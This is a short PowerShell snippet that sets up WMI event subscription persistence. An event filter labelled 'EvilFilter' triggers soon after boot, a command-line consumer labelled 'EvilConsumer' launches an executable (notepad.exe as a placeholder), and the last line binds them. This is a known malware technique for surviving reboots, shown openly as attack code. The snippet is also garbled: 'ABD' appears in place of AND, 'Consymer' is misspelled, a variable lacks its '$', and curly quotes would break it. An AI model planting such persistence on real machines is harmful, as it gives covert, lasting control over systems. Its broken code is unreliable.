$FilterName = ‘EvilFilter’
$ConsumerName = ‘EvilConsumer’
$EvilPath = ‘C:\Windows\System32\notepad.exe’
$Query = “SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ‘Win32_PerfFormattedData_PerfOS_System’ ABD TargetInstance.SystemUpTime >= 100 AND TargetInstance.SystemUpTime < 300”
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -Namespace “root\subscription” -Arguments @{Name=$FilterName;EventNameSpace=“root\cimv2”;QueryLanguage=“WQL”;Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace “root\subscription” -Arguments @{Name=$ConsumerName;ExecutablePath=$EvilPath;CommandLineTemplate=$EvilPath}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace “root\subscription” -Arguments @{Filter=WMIEventFilter;Consymer=$WMIEventConsymer}
